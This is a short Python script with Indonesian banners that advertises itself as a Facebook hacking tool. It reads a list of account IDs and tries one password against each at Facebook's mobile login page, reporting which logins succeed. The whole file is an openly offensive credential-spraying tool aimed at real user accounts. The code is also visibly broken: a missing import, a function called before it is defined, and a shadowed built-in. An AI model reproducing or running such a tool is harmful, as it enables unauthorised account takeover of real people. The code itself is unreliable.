import os
import sys
import time
from termcolor import colored

a = "\033[031m"

os.system('clear')
print ("======================================")
print ("AUTHOR : Mr XXXTRI3WSL")
print ("YOUTUBE: Ranz Team")
print ("TEAM   : None")
print ("LU BURIQ DAN GUA GANS")
print ("======================================")
print
print ("================   ================")
print ("088233965911          INDONESIA")
print ("=============      ================")
time.sleep(2)
print
print ("===============================")
print ("GASKEUN COOK!!!")
print ("===============================")
print
print
print ("===========================")
print ("1). MEMLULAI HACK FACEBOOK")
print ("===========================")
time.sleep(2)
print ("===========================")
print ("2).       EXIT")
print ("===========================")
time.sleep(3)
pilih = str(input('[?] pilih : '))

if pilih == "1":
        os.system('pkg update && pkg upgrade')
        os.system('pkg install python2')
        os.system('pkg install git')
        os.system('pip2 install requests')
        os.system('pip2 install mechanize')
        os.system('pip install termcolor')

os.system('clear')
print ("█████████")
print ("█▄█████▄█================================")
print ("█▼▼▼▼▼     Author : Mr XXXTRI3WSL")
print ("█          Youtube: Ranz Team")
print ("█▲▲▲▲▲     Team   : None")
print ("█████████================================")
print ("_██____██")
print
print
id = input("Enter ID list : ")
pw = input("password to  crack : ")


try:
        list(id,pw)

except:
        exit()

def brute(id,pw):
        link = "https://m.facebook.com/login.php"
        data = {"email":id, "pass":pw}
        r = requests.post(link, data=data)
        print (r.url)
        if "m_sess" in r.url:
                print ("found "+ id +" ~>  " + pw)
        elif "checkpoint" in r.url:
                print ("checkpoint "+ id +" ~>  " + pw)
        else:
                print ("failed "+ id )
def list(open,pw):
        file = open(open, "r").readlines()
        for i in file:
                brute(i.strip(),pw)

try:
        list(id,pw)

except:
        exit()
